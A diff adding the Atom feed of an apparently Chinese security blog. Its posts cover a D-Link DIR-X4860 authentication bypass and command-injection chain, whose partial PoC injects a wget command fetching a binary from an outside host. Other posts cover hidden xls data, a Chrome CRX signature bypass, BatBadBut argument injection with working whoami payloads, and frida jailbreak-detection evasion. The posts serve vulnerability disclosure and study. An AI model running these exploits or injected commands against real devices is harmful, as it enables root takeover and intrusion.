@@ -1,0 +1,595 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://AegeanYan.github.io</id>
+    <title>AegeanYan的小酒馆</title>
+    <updated>2024-06-04T14:43:51.225Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://AegeanYan.github.io"/>
+    <link rel="self" href="https://AegeanYan.github.io/atom.xml"/>
+    <subtitle>此处有崇山峻岭，茂林修竹</subtitle>
+    <logo>https://AegeanYan.github.io/images/avatar.png</logo>
+    <icon>https://AegeanYan.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, AegeanYan的小酒馆</rights>
+    <entry>
+        <title type="html"><![CDATA[Google sheet打开空白xls]]></title>
+        <id>https://AegeanYan.github.io/post/google-sheet-da-kai-kong-bai-xls/</id>
+        <link href="https://AegeanYan.github.io/post/google-sheet-da-kai-kong-bai-xls/">
+        </link>
+        <updated>2024-06-04T14:43:21.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>通过将某空白xls格式的加密凭证用Google sheet打开，取得了意想不到的破解效果，推测是xls上某种弱加密方式受到了软件兼容问题。</p>
+</blockquote>
+<p>作者在Bugcrowd悬赏的目标网站上寻找漏洞时发现了一个名为<code>redacted.xls</code> 的可疑文件，正常打开是一片空白，使用电子取证技术结果如下</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/202406042224911.png" alt="" loading="lazy"></figure>
+<ul>
+<li>该文件Security项标为Password protected，但实际打开时没有输入密码</li>
+<li>文件大小约为16KB，但看上去是空的，元数据理应只占1-2KB</li>
+<li>使用OLE及其他工具提取数据一无所获</li>
+</ul>
+<p>奇怪的是，使用Excel和LibreOffice打开该xls文件时出现了异常现象: Excel中的显示从J列开始，而LibreOffice中从L列开始：某些表格类数据确实被隐藏了。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/202406042230121.png" alt="" loading="lazy"></figure>
+<p>然而，当用Google Sheet打开它时，意外的是可以展开J列了</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/202406042232404.png" alt="" loading="lazy"></figure>
+<p>隐藏信息包含了大量的“企业详细信息”、“用户ID和密码”、“登录页面地址”等。</p>
+<h6 id="conclusion">Conclusion</h6>
+<p>该文件采取了某种过时的空白加密方式以至于市面上的取证方法无法识别，但由于兼容性问题，在Google Sheet中将其显示出来。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DIR-X4860_D-link路由器0day漏洞]]></title>
+        <id>https://AegeanYan.github.io/post/dir-x4860_d-link-lu-you-qi-0day-lou-dong/</id>
+        <link href="https://AegeanYan.github.io/post/dir-x4860_d-link-lu-you-qi-0day-lou-dong/">
+        </link>
+        <updated>2024-05-22T04:34:25.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>D-Link是一家台湾企业，主要产品是交换机、路由器等网络产品，但其产品曝出多个安全漏洞，仅2024.4其NAS产品就曝出了CVE-2024-3272、CVE-2024-3273漏洞。且D-Link对待这些漏洞比较消极。</p>
+<p>DIR-X4860 中的安全漏洞允许未经身份验证的远程攻击者访问 HNAP 端口以获得提升的权限，并以<code>root</code>身份执行指令。通过将身份验证绕过与命令执行相结合，设备可能会被完全破坏。该漏洞尚未被重视。</p>
+</blockquote>
+<p><strong>发现者：</strong> SSD Secure Disclosure的安全研究人员</p>
+<p><strong>供应商回应：</strong> 过去一个月中他们已联系供应商3次，但未收到回应。</p>
+<p><strong>受影响版本：</strong> 运行<code>DIRX4860A1_FWV1.04B03</code>固件的DIR-x4860</p>
+<p><strong>漏洞成因：</strong> 固件在HNAP协议上对身份验证算法实施的不正确</p>
+<h6 id="hnap协议">HNAP协议</h6>
+<p>**Step 1:**发送login请求并等待响应</p>
+<pre><code>Headers:
+&quot;Content-Type&quot;: &quot;text/xml; charset=utf-8&quot;
+&quot;SOAPAction&quot;: &quot;http://purenetworks.com/HNAP1/Login&quot;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
+      &lt;Action&gt;request&lt;/Action&gt;
+      &lt;Username&gt;Admin&lt;/Username&gt; //Admin是默认管理员账户
+      &lt;LoginPassword/&gt;
+      &lt;Captcha/&gt;
+    &lt;/Login&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre>
+<p>响应数据</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;LoginResponse xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
+      &lt;LoginResult&gt;OK&lt;/LoginResult&gt;
+      &lt;Challenge&gt;........&lt;/Challenge&gt;
+      &lt;Cookie&gt;........&lt;/Cookie&gt;
+      &lt;PublicKey&gt;........&lt;/PublicKey&gt;
+    &lt;/LoginResponse&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre>
+<p>Cookie项用于填充后续所有HTTP请求，Challenge和PublicKey用于计算HNAP_AUTH作为HTTP包头的身份验证</p>
+<pre><code class="language-pseudocode">LoginPassword:
+PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
+LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
+uid :
+uid = Cookie
+HNAP_AUTH:
+    SOAP_NAMESPACE2 = &quot;http://purenetworks.com/HNAP1/&quot;
+    Action = &quot;Login&quot;
+    SOAPAction = '&quot;' + SOAP_NAMESPACE2 + Action + '&quot;'
+    Time = int(round(time.time() * 1000))
+    Time = math.floor(Time) % 2000000000000
+    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
+</code></pre>
+<p>**Step 2:**发送正式login并等待响应</p>
+<pre><code class="language-xml">Headers:
+&quot;Content-Type&quot;: &quot;text/xml; charset=utf-8&quot;
+&quot;SOAPAction&quot;: &quot;http://purenetworks.com/HNAP1/Login&quot;
+&quot;HNAP_AUTH&quot;: &quot;........&quot;
+&quot;Cookie&quot;: &quot;uid=........&quot; //默认填充
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
+      &lt;Action&gt;login&lt;/Action&gt;
+      &lt;Username&gt;Admin&lt;/Username&gt;
+      &lt;LoginPassword&gt;........&lt;/LoginPassword&gt;
+      &lt;Captcha/&gt;
+    &lt;/Login&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre>
+<p>响应数据</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;LoginResponse xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
+      &lt;LoginResult&gt;success&lt;/LoginResult&gt;//success代表成功
+    &lt;/LoginResponse&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre>
+<h6 id="身份漏洞">身份漏洞</h6>
+<p>在<code>/bin/prog.cgi</code>文件中发现漏洞</p>
+<pre><code class="language-c">int __fastcall sub_5394C(int a1, int a2, int a3, int a4)
+{
+  int v5; // r1
+  char *v6; // r0
+  const char *v7; // r5
+  const char *v8; // r5
+  int v10; // r0
+  int v11; // r1
+  int v12; // r2
+  int v13; // r3
+  sub_53074(a1, a2, a3, a4);
+  if ( sub_51038(a1) )
+  {
+    v6 = GetHNAPParam(a1, &quot;/Login/Action&quot;);
+    v7 = v6;
+    if ( v6 )
+    {
+      if ( !strncmp(v6, &quot;request&quot;, 7u) )
+      {
+        handle_login_request(a1); // into here !!!
+        return 1;
+      }
+      ******
+}
+int __fastcall handle_login_request(int a1)
+{
+  char *Username; // r11
+  int v3; // r5
+  int result; // r0
+  const char *PrivateLogin; // [sp+Ch] [bp-84h]
+  char s[64]; // [sp+10h] [bp-80h] BYREF
+  char v7[64]; // [sp+50h] [bp-40h] BYREF
+  char v8[64]; // [sp+90h] [bp+0h] BYREF
+  char http_password[64]; // [sp+D0h] [bp+40h] BYREF
+  char v10[128]; // [sp+110h] [bp+80h] BYREF
+  memset(s, 0, sizeof(s));
+  memset(v7, 0, sizeof(v7));
+  memset(v8, 0, sizeof(v8));
+  memset(http_password, 0, sizeof(http_password));
+  memset(v10, 0, sizeof(v10));
+  if ( sub_51FE4(a1) )
+  {
+    sub_5322C(a1, 5);
+    result = 0;
+  }
+  else
+  {
+    GetHNAPParam(a1, &quot;/Login/Action&quot;);
+    Username = GetHNAPParam(a1, &quot;/Login/Username&quot;);
+    GetHNAPParam(a1, &quot;/Login/LoginPassword&quot;);
+    GetHNAPParam(a1, &quot;/Login/Captcha&quot;);
+    PrivateLogin = GetHNAPParam(a1, &quot;/Login/PrivateLogin&quot;);
+    sub_50F98(s, 20);
+    sub_50F98(v7, 10);
+    sub_50F98(v8, 20);
+    if ( PrivateLogin &amp;&amp; !strncmp(PrivateLogin, &quot;Username&quot;, 8u) )
+      strncpy(http_password, Username, 0x40u); // Authentication Bypass!!
+    else
+      get_http_password(http_password, 0x40u);
+    sub_51284(s, http_password, v8, v10, 128);
+    v3 = sub_51468(a1, v10, s, v7, v8);
+    sub_51094(a1, v7);
+    sub_5322C(a1, 0);
+    result = v3;
+  }
+  return result;
+}
+</code></pre>
+<p>如果包含&quot;PrivateLogin&quot;关键词且与&quot;Username&quot;相同，就会直接将用户名作为密钥验证</p>
+<p>这里我们用&quot;Admin&quot;作为密码</p>
+<pre><code class="language-pseudocode">LoginPassword:
+password = ”Admin&quot;
+PrivateKey = get_hmac_KEY_md5(PublicKey + password,Challenge)
+LoginPassword = get_hmac_KEY_md5(PrivateKey,Challenge)
+uid :
+uid = Cookie
+HNAP_AUTH:
+    SOAP_NAMESPACE2 = &quot;http://purenetworks.com/HNAP1/&quot;
+    Action = &quot;Login&quot;
+    SOAPAction = '&quot;' + SOAP_NAMESPACE2 + Action + '&quot;'
+    Time = int(round(time.time() * 1000))
+    Time = math.floor(Time) % 2000000000000
+    HNAP_AUTH = get_hmac_KEY_md5(PrivateKey,Time + SOAPAction)
+</code></pre>
+<h6 id="利用链">利用链：</h6>
+<p><em>D-Link DIR-X4860 SetVirtualServerSettings LocalIPAddress Command Injection Remote Code Execution</em></p>
+<p><code>/bin/prog.cgi</code>中的函数<code>SetVirtualServerSettings</code>存在漏洞</p>
+<pre><code class="language-c">void __fastcall SetVirtualServerSettings(int a1)
+{
+      ******
+      log_log(7, &quot;SetVirtualServerSettings&quot;, 599, &quot;pProtocolNumber=%s\n&quot;, v19);
+      snprintf(v20, 0x100u, &quot;/SetVirtualServerSettings/VirtualServerList/VirtualServerInfo:%d/%s&quot;, v3, &quot;LocalIPAddress&quot;);
+      LocalIPAddress_v16 = GetHNAPParam(a1, v20);
+      if ( !LocalIPAddress_v16 )
+      {
+        v5 = 604;
+        goto LABEL_9;
+      }
+      log_log(7, &quot;SetVirtualServerSettings&quot;, 606, &quot;pLocalIPAddress=%s\n&quot;, LocalIPAddress_v16);
+      snprintf(v20, 0x100u, &quot;/SetVirtualServerSettings/VirtualServerList/VirtualServerInfo:%d/%s&quot;, v3, &quot;ScheduleName&quot;);
+      v8 = GetHNAPParam(a1, v20);
+      if ( !v8 )
+      {
+        v5 = 611;
+        goto LABEL_9;
+      }
+      if ( !strcmp(s1, &quot;true&quot;)
+        &amp;&amp; !strcmp(v13, &quot;9&quot;)
+        &amp;&amp; !strcmp(v7, &quot;UDP&quot;)
+        &amp;&amp; FCGI_popen_v1(LocalIPAddress_v16, v13, v7, s, ++v14) == -1 ) // into here !!!
+      {
+        v5 = 620;
+        goto LABEL_9;
+      }
+      ******
+}
+int __fastcall FCGI_popen_v1(const char *LocalIPAddress, int a2, int a3, char *a4, int a5)
+{
+  int v7; // r0
+  int v8; // r6
+  char v10[20]; // [sp+Ch] [bp-14h] BYREF
+  char v11[64]; // [sp+20h] [bp+0h] BYREF
+  char v12[68]; // [sp+60h] [bp+40h] BYREF
+  memset(v11, 0, sizeof(v11));
+  memset(v10, 0, 0x12u);
+  memset(v12, 0, 0x40u);
+  snprintf(v12, 0x40u, &quot;arp | grep %s | awk '{printf $4}'&quot;, LocalIPAddress);
+  v7 = FCGI_popen(v12, &quot;r&quot;); // rce !!!
+  ******
+}
+</code></pre>
+<p>通过篡改<code>LocalIPAddress</code>即可在root上下文执行命令</p>
+<h6 id="part-of-poc">Part of PoC</h6>
+<pre><code class="language-c">def login_request(ip, port, https):
+    &quot;&quot;&quot;login_result&quot;&quot;&quot;
+    xml_post = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+    &lt;soap:Body&gt;
+        &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
+            &lt;Action&gt;request&lt;/Action&gt;
+            &lt;Username&gt;Admin&lt;/Username&gt;
+            &lt;PrivateLogin&gt;Username&lt;/PrivateLogin&gt;
+            &lt;login_password&gt;&lt;/login_password&gt;
+            &lt;Captcha&gt;&lt;/Captcha&gt;
+        &lt;/Login&gt;
+    &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;&quot;&quot;&quot;
+    headers = {
+        &quot;Host&quot;: ip,
+        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
+        &quot;SOAPAction&quot;: '&quot;http://purenetworks.com/HNAP1/Login&quot;',
+        &quot;Content-Type&quot;: &quot;text/xml; charset=UTF-8&quot;,
+    }
+    challenge, cookie, public_key, _ = send_http(ip, port, https, headers, xml_post)
+    if challenge == b&quot;&quot;:
+        print(&quot;[-] get Challenge error&quot;)
+        sys.exit(0)
+    return challenge, cookie, public_key
+
+def login_login(ip, port, https, login_password, hnap_auth, time_now, cookie):
+    &quot;&quot;&quot;login_login&quot;&quot;&quot;
+    xml_post = f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+    &lt;soap:Body&gt;
+        &lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
+            &lt;Action&gt;login&lt;/Action&gt;
+            &lt;Username&gt;Admin&lt;/Username&gt;
+            &lt;LoginPassword&gt;{login_password}&lt;/LoginPassword&gt;
+            &lt;Captcha&gt;&lt;/Captcha&gt;
+        &lt;/Login&gt;
+    &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;&quot;&quot;&quot;
+    headers = {
+        &quot;Host&quot;: ip,
+        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
+        &quot;HNAP_AUTH&quot;: f&quot;{hnap_auth} {time_now}&quot;,
+        &quot;SOAPAction&quot;: '&quot;http://purenetworks.com/HNAP1/Login&quot;',
+        &quot;Content-Type&quot;: &quot;text/xml; charset=UTF-8&quot;,
+        &quot;Cookie&quot;: f&quot;uid={cookie}&quot;,
+    }
+    send_http(ip, port, https, headers, xml_post)
+def set_virtual_server_settings(ip, port, https, hnap_auth, time_now, cookie, cmd):
+    &quot;&quot;&quot;set_virtual_server_settings&quot;&quot;&quot;
+    xml_post = f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+    &lt;soap:Body&gt;
+        &lt;SetVirtualServerSettings xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;
+            &lt;VirtualServerList&gt;
+                &lt;VirtualServerInfo&gt;
+                    &lt;Enabled&gt;true&lt;/Enabled&gt;
+                    &lt;VirtualServerDescription&gt;false&lt;/VirtualServerDescription&gt;
+                    &lt;ExternalPort&gt;false&lt;/ExternalPort&gt;
+                    &lt;InternalPort&gt;9&lt;/InternalPort&gt;
+                    &lt;ProtocolType&gt;UDP&lt;/ProtocolType&gt;
+                    &lt;ProtocolNumber&gt;UDP&lt;/ProtocolNumber&gt;
+                    &lt;LocalIPAddress&gt;{cmd}&lt;/LocalIPAddress&gt;//将IP替换成注入命令
+                    &lt;ScheduleName&gt;false&lt;/ScheduleName&gt;
+                &lt;/VirtualServerInfo&gt;
+                &lt;VirtualServerInfo:0&gt;
+                    &lt;Enabled&gt;true&lt;/Enabled&gt;
+                    &lt;VirtualServerDescription&gt;false&lt;/VirtualServerDescription&gt;
+                    &lt;ExternalPort&gt;false&lt;/ExternalPort&gt;
+                    &lt;InternalPort&gt;9&lt;/InternalPort&gt;
+                    &lt;ProtocolType&gt;UDP&lt;/ProtocolType&gt;
+                    &lt;ProtocolNumber&gt;UDP&lt;/ProtocolNumber&gt;
+                    &lt;LocalIPAddress&gt;{cmd}&lt;/LocalIPAddress&gt;
+                    &lt;ScheduleName&gt;false&lt;/ScheduleName&gt;
+                &lt;/VirtualServerInfo:0&gt;
+                &lt;VirtualServerInfo:1&gt;
+                    &lt;Enabled&gt;true&lt;/Enabled&gt;
+                    &lt;VirtualServerDescription&gt;false&lt;/VirtualServerDescription&gt;
+                    &lt;ExternalPort&gt;false&lt;/ExternalPort&gt;
+                    &lt;InternalPort&gt;9&lt;/InternalPort&gt;
+                    &lt;ProtocolType&gt;UDP&lt;/ProtocolType&gt;
+                    &lt;ProtocolNumber&gt;UDP&lt;/ProtocolNumber&gt;
+                    &lt;LocalIPAddress&gt;{cmd}&lt;/LocalIPAddress&gt;
+                    &lt;ScheduleName&gt;false&lt;/ScheduleName&gt;
+                &lt;/VirtualServerInfo:1&gt;
+            &lt;/VirtualServerList&gt;
+        &lt;/SetVirtualServerSettings&gt;
+    &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;&quot;&quot;&quot;
+    headers = {
+        &quot;Host&quot;: ip,
+        &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,
+        &quot;HNAP_AUTH&quot;: f&quot;{hnap_auth} {time_now}&quot;,
+        &quot;SOAPAction&quot;: '&quot;http://purenetworks.com/HNAP1/SetVirtualServerSettings&quot;',
+        &quot;Content-Type&quot;: &quot;text/xml; charset=UTF-8&quot;,
+        &quot;Cookie&quot;: f&quot;uid={cookie}&quot;,
+    }
+    send_http(ip, port, https, headers, xml_post)
+def exploit():
+  dummy_password = &quot;Admin&quot;
+  private_key = get_hmac_key_md5(public_key + dummy_password, challenge)
+  login_password = get_hmac_key_md5(private_key, challenge)
+  print(f&quot;[+] login_password : {login_password}&quot;)
+  soap_namespace2 = &quot;http://purenetworks.com/HNAP1/&quot;
+  action = &quot;Login&quot;
+  soap_action = f'&quot;{soap_namespace2}{action}&quot;'
+  print(f&quot;[+] SOAPAction : {soap_action}&quot;)
+  time_now = int(round(time.time() * 1000))
+  time_now = math.floor(time_now) % 2000000000000
+  time_now = &quot;%d&quot; % time_now
+  print(f&quot;[+] Time : {time_now}&quot;)
+  hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
+  print(f&quot;[+] HNAP_AUTH : {hnap_auth}&quot;)
+  login_login(
+      target_ip, target_port, target_https, login_password, hnap_auth, time_now, cookie
+  )
+    
+  cmd = &quot;1;wget http://192.168.0.100:8000/busybox -O /tmp/tel;AAAAAAAAAAA&quot;
+  set_virtual_server_settings(
+      target_ip, target_port, target_https, hnap_auth, time_now, cookie, cmd
+  )
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Chrome extension CRX文件格式解压问题]]></title>
+        <id>https://AegeanYan.github.io/post/cve-2024-0333-chrome-extension/</id>
+        <link href="https://AegeanYan.github.io/post/cve-2024-0333-chrome-extension/">
+        </link>
+        <updated>2024-05-08T04:34:51.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="cve-2024-0333-chrome-extension">CVE-2024-0333 Chrome extension</h1>
+<blockquote>
+<p>Chromium在检查浏览器组建文件时，由于ZIP32位和ZIP64位的遗留问题，在EOF符号处产生歧义和逻辑错误（可能是为了效率），输入验证不足，导致可以对64KB大小以下的扩展程序和浏览器组件进行注入和提权</p>
+</blockquote>
+<p>**CVSS等级：**5.3</p>
+<p>**受影响应用：**Google chrome &lt;= 120.0.6099.216</p>
+<p><strong>漏洞影响面：</strong> 很小，在Chrome插件市场和Chrome自身组件中没有，仅可能对企业自定义插件有影响</p>
+<h4 id="漏洞介绍">漏洞介绍</h4>
+<hr>
+<p>Chromium所有扩展和大多数浏览器组件更新都使用 CRX 文件格式，它实际上是一个<a href="https://en.wikipedia.org/wiki/ZIP_(file_format)">ZIP 文件</a>，前面带有包含签名和其他元数据的标头，以保证文件完整性。</p>
+<p><u>Google Chrome Elevation Service</u>可以获取低特权的可执行文件并以较高的特权运行它，可以用于安装某些更新。其通过下列过程来防止被篡改：</p>
+<ul>
+<li>将用户指定的CRX文件复制到受信任的位置（低权限用户无权将任何其他文件注入受信任位置）</li>
+<li><strong>对文件执行签名验证</strong>（任何篡改压缩可执行文件的尝试都会使签名无效并阻止其运行）</li>
+<li>解压缩</li>
+<li>运行提取的可执行文件</li>
+</ul>
+<p>**绕过签名验证是可能的：**CRX文件格式存在着向文件头（header）注入额外数据的可能性，且文件头本身包含的大部分数据无需经过验证。ZIP由于年代久远有ZIP32和ZIP64（大于4GB）两种格式，分别对应不同的EOF符号</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/AegeanYan/ImageBed/main/CVE-2024-0333.jpeg" alt="CVE-2024-0333" loading="lazy"></figure>
+<p><u>Chrome使用Minizip库来解压缩CRX（实际上是ZIP格式），寻找EOCD时，函数会从文件末尾向前查找<strong>64kB</strong>，Minizip会先尝试查找EOCD64，再查找EOCD（32），这就为注入带来了可能</u></p>
+<p>但这也使得该方法只能处理64kB大小以下（EOCD）的扩展程序，但插件应用市场中最小的是73kB。。。。</p>
+<p>Google允许公司自行定义企业级插件，这些插件可以从公司内部服务器自动安装和更新。在这些场景中，可能还存在64kB以下的扩展程序😂</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Rust\Python等编程语言对Win下CMD进行越权]]></title>
+        <id>https://AegeanYan.github.io/post/rustpython-deng-bian-cheng-yu-yan-dui-win-xia-cmd-jin-xing-yue-quan/</id>
+        <link href="https://AegeanYan.github.io/post/rustpython-deng-bian-cheng-yu-yan-dui-win-xia-cmd-jin-xing-yue-quan/">
+        </link>
+        <updated>2024-05-07T14:55:40.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="cve-2024-24576-windows-rust">CVE-2024-24576 Windows Rust</h1>
+<blockquote>
+<p>The Rust Security Response WG was notified that the Rust standard library did not properly escape arguments when invoking batch files (with the <code>bat</code> and <code>cmd</code> extensions) on Windows using the <a href="https://doc.rust-lang.org/std/process/struct.Command.html"><code>Command</code></a> API. An attacker able to control the arguments passed to the spawned process could execute arbitrary shell commands by bypassing the escaping.</p>
+</blockquote>
+<p>Rust 编程语言背后的项目声称，对特定 API 的任何调用都是安全的，即使输入的是不安全的内容，但研究人员找到了绕过保护的方法。利用该漏洞可以在windows cmd中注入恶意代码。</p>
+<p>**受影响的 Rust 版本：**Rust for Windows &lt; 1.77.2</p>
+<p>**CVSS等级：**10.0</p>
+<p><strong>漏洞影响面：</strong></p>
+<p>这个漏洞只存在于 Windows 系统，但不仅仅影响 Rust 语言，像 PHP、Python、Node.js 等均受影响，具体可以参考如下页面：</p>
+<ol>
+<li>CERT/CC: <a href="https://www.kb.cert.org/vuls/id/123335">Multiple programming languages fail to escape arguments properly in Microsoft Windows</a></li>
+<li>Flatt Security Inc./RyotaK: <a href="https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/">BatBadBut: You can’t securely execute commands on Windows</a></li>
+</ol>
+<h4 id="poc">PoC</h4>
+<h6 id="testbat">test.bat</h6>
+<pre><code class="language-bat">@echo off
+echo Argument received: %1
+</code></pre>
+<h6 id="testrs">test.rs</h6>
+<pre><code class="language-rust">use std::io::{self, Write};
+use std::process::Command;
+
+fn main() {
+    println!(&quot;enter payload here&quot;);
+    let mut input = String::new();
+    io::stdout().flush().expect(&quot;Failed to flush stdout&quot;);
+    io::stdin().read_line(&amp;mut input).expect(&quot;Failed to read from stdin&quot;);
+    let output = Command::new(&quot;./test.bat&quot;)
+                    .arg(input.trim())
+                    .output()
+                    .expect(&quot;Failed to execute command&quot;);
+    println!(&quot;Output:\n{}&quot;, String::from_utf8_lossy(&amp;output.stdout));
+}
+</code></pre>
+<h6 id="测试">测试</h6>
+<pre><code>D:\&gt;rustc test.rs
+
+D:\&gt;test.exe
+enter payload here
+aaa
+Output:
+Argument received: aaa
+
+D:\&gt;test.exe
+enter payload here
+aaa &amp; whoami
+Output:
+Argument received: &quot;aaa &amp; whoami&quot;
+
+D:\&gt;test.exe
+enter payload here
+aaa&quot; &amp; whoami
+Output:
+Argument received: &quot;aaa\&quot;
+desktop-618ia48\ddw
+</code></pre>
+<h6 id="错误逻辑与修复">错误逻辑与修复</h6>
+<p>漏洞版本会把样例包装成<code>cmd.exe /d /c &quot;&quot;D:\test.bat&quot; &quot;aaa\&quot; &amp; whoami&quot;&quot;</code></p>
+<p>修复版本会把样例包装成<code>cmd.exe /e:ON /v:OFF /d /c &quot;&quot;D:\test.bat&quot; &quot;aaa&quot;&quot; &amp; whoami&quot;&quot;</code></p>
+<h6 id="python样例">Python样例</h6>
+<pre><code>D:\&gt;python3
+Python 3.11.6 (tags/v3.11.6:8b6ee5b, Oct  2 2023, 14:57:12) [MSC v.1935 64 bit (AMD64)] on win32
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; import subprocess
+&gt;&gt;&gt; subprocess.Popen(['test.bat', 'aaa&quot; &amp; whoami'])
+&lt;Popen: returncode: None args: ['test.bat', 'aaa&quot; &amp; whoami']&gt;
+&gt;&gt;&gt; Argument received: &quot;aaa\&quot;
+desktop-618ia48\ddw
+</code></pre>
+<h5 id="总结">总结</h5>
+<p>在Windows下以Rust、Python及一些语言调用cmd时，运行.bat, .cmd等都会因为转义逻辑出错而产生预料外行为。该漏洞跟内存安全没有关系，是 Windows 下 <code>cmd.exe</code> 对命令行参数的特殊解析逻辑所导致的逻辑漏洞。</p>
+<h5 id="参考文档">参考文档</h5>
+<ol>
+<li>https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/</li>
+<li>https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html</li>
+<li>https://www.kb.cert.org/vuls/id/123335</li>
+<li>https://github.com/frostb1ten/CVE-2024-24576-PoC/tree/main</li>
+<li>https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw</li>
+<li>https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way</li>
+<li>https://persistence-info.github.io/Data/cmdautorun.html</li>
+<li>https://programlife.net/2024/04/14/cve-2024-24576-rust-command-injection-vulnerability/</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[记录几种越狱检测绕过]]></title>
+        <id>https://AegeanYan.github.io/post/ji-lu-ji-chong-yue-yu-jian-ce-rao-guo/</id>
+        <link href="https://AegeanYan.github.io/post/ji-lu-ji-chong-yue-yu-jian-ce-rao-guo/">
+        </link>
+        <updated>2024-04-09T12:20:28.000Z</updated>
+        <content type="html"><![CDATA[<p>这两天需要hook几款app，几乎每款都有越狱检测，故记录一下几种已经使用过的绕过方法。</p>
+<ul>
+<li>修改frida-server二进制文件名，绕过简单的文件名检测。爱思助手或者mv均可</li>
+<li>修改frida监听端口，默认检测27042。
+<ul>
+<li>./frida -l 0.0.0.0:41032</li>
+<li>iproxy 41032 41032</li>
